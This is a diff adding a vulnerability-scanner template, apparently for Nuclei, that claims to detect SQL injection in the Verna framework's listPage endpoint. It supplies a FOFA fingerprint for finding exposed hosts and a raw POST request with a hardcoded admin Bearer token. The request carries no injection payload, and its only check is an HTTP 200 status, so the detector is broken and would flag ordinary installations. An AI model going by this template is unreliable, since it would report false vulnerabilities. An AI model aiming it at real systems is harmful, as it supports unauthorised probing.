@@ -1,0 +1,48 @@
+id: poc-nt98fqi56y5i30w0
+info:
+  name: verna快速开发框架listPage 存在SQL注⼊漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nt98fqi56y5i30w0'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nt98fqi56y5i30w0
+    fofa: icon_hash="790525601"
+http:
+- raw:
+  - 'POST /demo/dealer/listPage HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 93
+
+    Accept: application/json, text/plain, */*
+
+    Authorization: Bearer pig::admin::a0d42981-008a-436c-83dd-0c83699e5947
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Content-Type: application/json;charset=UTF-8
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Referer: [http://127.0.0.1/](http://127.0.0.1/)
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+
+    {"orders":[{"column":"create_time","asc":false}],"current":1,"size":10,"extendFilterForm":
+
+    {}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
